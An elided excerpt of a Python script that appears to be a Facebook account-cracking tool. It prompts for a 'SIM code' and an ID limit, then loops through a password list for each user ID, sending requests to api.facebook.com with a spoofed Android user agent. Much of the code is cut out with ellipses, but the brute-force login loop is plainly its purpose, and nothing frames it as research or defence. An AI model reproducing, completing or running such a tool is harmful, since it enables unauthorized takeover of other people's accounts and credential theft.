...
"""
    ...
    def Main(self):
        ...
        # Handling EOFError for input
        try:
            code = input(f"{Y}ENTER SIM CODE тЄ {G}")
        except EOFError:
            print(f"{R}No SIM CODE provided. Using default '000000'.{N}")
            code = "000000" # Default SIM code
        
        try:
            limit = int(input(f"{Y}ENTER ID LIMIT тЄ {G}"))
        except ValueError:
            print(f"{R}LIMIT MUST BE A NUMBER. Using default 100.{N}")
            limit = 100 # Default limit if not a number
        except EOFError:
            print(f"{R}No ID LIMIT provided. Using default 100.{N}")
            limit = 100 # Default limit if no input
    ...
    def method(self, uid, passlist):
        ...
        try:
            for pw in passlist:
                ...
                headers = {
                    'User-Agent': "Mozilla/5.0 (Linux; Android 13; itel A665L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'api.facebook.com', # Changed Host to api.facebook.com
